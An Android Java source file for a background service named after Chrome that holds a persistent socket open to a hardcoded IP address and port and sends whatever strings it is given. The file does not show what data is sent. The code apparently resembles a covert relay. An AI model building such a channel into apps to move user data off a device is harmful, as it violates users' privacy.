package com.example.asa.chrometextension;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.icu.util.Output;
import android.os.IBinder;
import android.util.Log;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class Chrome_TExtension_Service extends Service {
    //Log tag
    private static final String LOG_TAG = Chrome_TExtension_Service.class.getSimpleName();
    //The socket we'll be opening to connect to our server
    private static Socket socket;
    //Our printwriter for writing to our socket
    static PrintWriter socket_writer;
    //Our Server information
    final static String IP = "159.203.25.93";
    final static int PORT = 1026;
    private static Chrome_TExtension_Service single_service;
    public Chrome_TExtension_Service() {
        if (socket == null) openConnection();
    }
    public static Chrome_TExtension_Service getInstance(){
        if (single_service == null) single_service = new Chrome_TExtension_Service();
        return single_service;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startID){
        return START_STICKY;
    }
    //Writes to the socket we've connected to.
    protected void writeToServer(final String s){
        while(socket_writer == null){
            try {Thread.sleep(10);}catch (Exception e){ }
        }
        new Thread(){
            @Override
            public void run(){
                socket_writer.println(s);
            }
        }.start();
    }
    //Opens a socket to our server
    private void openConnection(){
        new Thread(){
            @Override
            public void run(){
                try {
                    InetAddress IA = InetAddress.getByName(IP);
                    socket = new Socket(IA,PORT);
                    OutputStream out = socket.getOutputStream();
                    socket_writer = new PrintWriter(out,true);
                } catch (UnknownHostException e) {
                    Log.e(LOG_TAG, "UnknownHostException when attempting to create a socket: " + e.getMessage());
                } catch (IOException e) {
                    Log.e(LOG_TAG, "IO Exception when attempting to create a socket: " + e.getMessage());
                }
            }
        }.start();
    }
    //Closes socket and our PrintWriter
    private void closeConnection(){
        try {
            socket.close();
        } catch (IOException e){
             Log.e(LOG_TAG, "Couldn't close the socket : " + e.getMessage());
        }
        if (socket_writer != null) socket_writer.close();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
